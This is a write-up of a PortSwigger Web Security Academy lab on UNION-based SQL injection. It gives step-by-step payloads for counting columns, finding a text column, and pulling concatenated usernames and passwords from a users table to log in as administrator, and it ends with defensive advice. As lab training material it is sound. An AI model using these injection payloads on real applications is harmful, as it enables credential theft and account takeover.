# Technical Notes

## Lab: SQL Injection UNION Attack — Retrieving Multiple Values in a Single Column

---

## 1. Injection Point

The vulnerable functionality was identified in the product category filter.

The affected parameter was:

```text
category
```

The request was intercepted and transferred to Burp Suite Repeater for controlled testing.

Original request:

```http
GET /filter?category=Accessories HTTP/2
```

---

## 2. Determine the Number of Columns

The first step was to determine how many columns were returned by the original SQL query.

Payload:

```sql
' UNION SELECT NULL,NULL--
```

The request was accepted successfully.

### Finding

The original query returns:

```text
2 columns
```

This established the structure required for subsequent UNION queries.

### Evidence

See:

```text
screenshots/03-column-count.png
```

---

## 3. Identify the Text-Compatible Column

The next step was to determine which returned column could contain text.

### First Test

Payload:

```sql
' UNION SELECT 'abc',NULL--
```

The application returned an internal server error.

### Second Test

Payload:

```sql
' UNION SELECT NULL,'abc'--
```

This request was successful.

The second column therefore accepts text data.

### Finding

```text
Column 1 → Not text-compatible
Column 2 → Text-compatible
```

### Evidence

See:

```text
screenshots/04-text-compatible-column.png
```

---

## 4. Identify the Target Table

The lab description specifies a separate table named:

```text
users
```

The table contains:

```text
username
password
```

The objective was to retrieve both fields.

---

## 5. Retrieve Multiple Values Through One Column

Because only the second UNION column was compatible with text, the `username` and `password` fields were concatenated into a single value.

Concatenation expression:

```sql
username||'~'||password
```

The `~` character was used as a separator.

The complete payload was:

```sql
' UNION SELECT NULL,username||'~'||password FROM users--
```

### Query Logic

The query can be understood as:

```text
UNION
  ↓
SELECT
  ↓
NULL                    → first column
username || '~' || password
                         → second column
  ↓
FROM users
```

Each database record is therefore returned as a single text value:

```text
username~password
```

---

## 6. Extracted Data

The response returned multiple records from the `users` table.

The extracted usernames included:

```text
wiener
administrator
carlos
```

The actual password values are intentionally omitted from this documentation.

### Security Note

The credential extraction was performed only against the PortSwigger Web Security Academy lab environment.

Sensitive credentials should not be committed to a public GitHub repository.

---

## 7. Administrator Authentication

The extracted administrator credentials were submitted through the application's login functionality.

The authentication succeeded.

The application subsequently displayed:

```text
Your username is: administrator
```

This confirmed successful authentication as the privileged user.

---

## 8. Lab Completion

After successful administrator authentication, the PortSwigger Web Security Academy lab displayed:

```text
LAB — Solved
```

This confirms that the complete attack chain was successfully demonstrated.

### Evidence

```text
screenshots/06-lab-solved.png
```

---

## 9. Attack Chain

The complete attack flow was:

```text
Product Category Filter
        ↓
SQL Injection
        ↓
Determine Column Count
        ↓
Identify Text-Compatible Column
        ↓
UNION SELECT
        ↓
Retrieve users Table
        ↓
Concatenate username + password
        ↓
Extract Credentials
        ↓
Authenticate as Administrator
        ↓
Lab Solved
```

---

## 10. Key Learning Points

### UNION-based SQL Injection

A UNION attack allows an attacker to append the results of another SQL query to the original query.

### Column Count

The number of columns in the injected SELECT statement must match the number of columns returned by the original query.

### Data Type Compatibility

The injected values must be compatible with the corresponding columns returned by the original query.

### String Concatenation

When only one column can display text, multiple database fields can be concatenated into a single value.

### Credential Disclosure

SQL injection can expose authentication-related information stored in database tables.

### Authentication Impact

If credentials are retrieved successfully, SQL injection can lead to account compromise rather than merely information disclosure.

---

## 11. Defensive Considerations

The primary defense against SQL injection is the use of parameterized queries.

Unsafe pattern:

```text
User Input
    ↓
String Concatenation
    ↓
SQL Query
```

Secure pattern:

```text
User Input
    ↓
Parameterized Query
    ↓
Database
```

Additional controls should include:

* Least-privilege database accounts.
* Secure password hashing.
* Proper error handling.
* Server-side input validation.
* Security-focused code review.
* Automated SQL injection testing.
* Regular penetration testing.

---

## 12. References

Primary learning resource:

```text
PortSwigger Web Security Academy
SQL Injection — UNION Attacks
```

The lab was completed in the authorized PortSwigger Web Security Academy environment.
